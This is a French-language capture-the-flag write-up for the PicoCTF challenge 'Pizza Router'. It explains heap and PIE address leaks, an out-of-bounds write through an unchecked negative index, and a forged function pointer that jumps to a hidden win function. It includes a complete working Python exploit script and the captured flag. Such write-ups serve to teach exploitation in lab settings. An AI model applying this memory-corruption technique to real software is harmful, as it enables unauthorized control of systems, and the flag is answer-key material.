# Writeup: Pizza Router - PicoCTF

## Description du Challenge
Le challenge propose un service de routage de drones de livraison sur une grille de ville. Le binaire permet de charger des cartes, d'ajouter des commandes (`add_order`), de recalculer des routes (`reroute`) et d'expédier les drones (`dispatch`). L'objectif est d'exploiter le binaire pour appeler une fonction cachée `win` qui affiche le flag.

## Analyse des Vulnérabilités

### 1. Fuites d'Adresses (Leaks)
*   **Heap Leak** : La commande `receipt` affiche un champ `hint`, qui correspond à l'adresse mémoire (heap) de la structure de données allouée pour le drone.
*   **PIE Leak** : Lorsqu'une commande est marquée comme livrée via `dispatch`, le binaire stocke un pointeur vers la fonction de rendu par défaut (`fx_draw_basic`) dans la structure globale `ORD`. La commande `replay` permet ensuite d'afficher ce pointeur via `renderer=%p`. Cela permet de calculer l'adresse de base du binaire (PIE) et donc l'adresse de la fonction `win`.

### 2. Écriture Hors Limites (OOB Write)
La vulnérabilité majeure réside dans la commande `reroute <id> <heap_idx> <new_cost>`. Le paramètre `heap_idx` n'est pas vérifié avant d'accéder au tableau des chemins du drone :
```c
rsi = [calloc_ptr + 0x8]; // Début du tableau de chemin
rcx = rsi + heap_idx * 8; // Accès sans vérification de bornes
[rcx] = order.y * grid_width + order.x; // Écriture des 32 bits de poids faible
[rcx + 4] = new_cost;                   // Écriture des 32 bits de poids fort
```
En utilisant un index négatif, nous pouvons remonter dans la mémoire et atteindre la section `.bss` du binaire PIE, où sont stockées les métadonnées des commandes (`ORD`).

## Stratégie d'Exploitation

### Phase 1 : Collecte d'informations
1.  On ajoute une commande et on utilise `receipt` pour obtenir l'adresse heap.
2.  On livre cette commande via `dispatch` puis on utilise `replay` pour obtenir l'adresse de `fx_draw_basic`. On en déduit l'adresse de base PIE et l'adresse cible de `win`.

### Phase 2 : Forgeage de l'adresse de saut
L'écriture OOB via `reroute` possède une contrainte : les 32 bits de poids faible sont imposés par `y * 16 + x`. Normalement, `x` et `y` sont limités par la taille de la grille (16x13), limitant cette valeur à 207, ce qui est insuffisant pour forger un pointeur PIE valide.

**Contournement :**
1.  On calcule la distance entre la heap et la section `.bss` du PIE.
2.  On utilise un premier `reroute` avec un index négatif pour écraser le champ `x` de notre propre commande (stockée dans `ORD[1]` en `.bss`). En injectant une valeur arbitraire dans `x`, on peut désormais contrôler le résultat du calcul `y * 16 + x`.
3.  On profite de ce premier `reroute` pour modifier aussi l'ID de la commande (en écrasant `ORD[1].id`) afin de pouvoir manipuler l'objet modifié.

### Phase 3 : Détournement du flux de contrôle
1.  On effectue un second `reroute` sur notre commande modifiée (ID 50), cette fois avec un `heap_idx` de 132 pour cibler le pointeur de fonction de rendu à l'intérieur de la structure du drone.
2.  Les 32 bits de poids faible sont forgés par notre `x` modifié.
3.  Les 32 bits de poids fort sont injectés via le paramètre `new_cost`.
4.  On appelle `dispatch 50`. Le programme déréférence notre pointeur forgé et saute directement dans la fonction `win`, nous donnant le flag.

## Script d'Exploit (`solve.py`)

```python
#!/usr/bin/env python3
import socket, time, re, sys

def conn_remote():
    s = socket.socket()
    s.connect(("mysterious-sea.picoctf.net", 52995))
    s.settimeout(3)
    return s

class IO:
    def __init__(self, p_or_s):
        self.p = p_or_s
        self.buf = b""
    def recv(self, timeout=0.5):
        time.sleep(timeout)
        self.p.settimeout(timeout)
        try:
            while True:
                d = self.p.recv(4096)
                if not d: break
                self.buf += d
        except: pass
        r = self.buf; self.buf = b""
        return r
    def sendline(self, data):
        data = data if isinstance(data, bytes) else data.encode()
        self.p.sendall(data + b"\n")

def cmd(io, c, wait=0.4):
    io.sendline(c)
    return io.recv(wait)

# Initialisation
io = IO(conn_remote())
r = io.recv(1)

# 1. Fuite PIE et Heap
cmd(io, "load city1")
cmd(io, "add_order 2 3")
r = cmd(io, "receipt 0")
m = re.search(rb'hint=(0x[0-9a-fA-F]+)', r)
cp0 = int(m.group(1), 16)
cmd(io, "dispatch 0")
r = cmd(io, "replay 0")
m = re.search(rb'renderer=(0x[0-9a-fA-F]+)', r)
leaked_fx = int(m.group(1), 16)
pie = leaked_fx - 0x2260
win = pie + 0x2460

# 2. Préparation de la commande d'exploit
cmd(io, "add_order 2 3")
r = cmd(io, "receipt 1")
m = re.search(rb'hint=(0x[0-9a-fA-F]+)', r)
cp1 = int(m.group(1), 16)

win_low = win & 0xFFFFFFFF
win_high = (win >> 32) & 0xFFFFFFFF
target_x = (win_low - (3*16)) & 0xFFFFFFFF
if target_x >= 0x80000000: target_x_signed = target_x - 0x100000000
else: target_x_signed = target_x

# 3. Écriture OOB dans le .bss pour forger POS et ID
idx1 = (pie + 0x5080 + 0x1038 - (cp1 + 0x18)) // 8
cmd(io, f"reroute 1 {idx1} {target_x_signed}")

# 4. Échange du pointeur de fonction et déclenchement
cmd(io, f"reroute 50 132 {win_high}")
io.sendline("dispatch 50")
time.sleep(1.5)
print(io.recv(2).decode())
```

## Flag
**`flag{thirty_minutes_or_flag_free_f22667be}`**
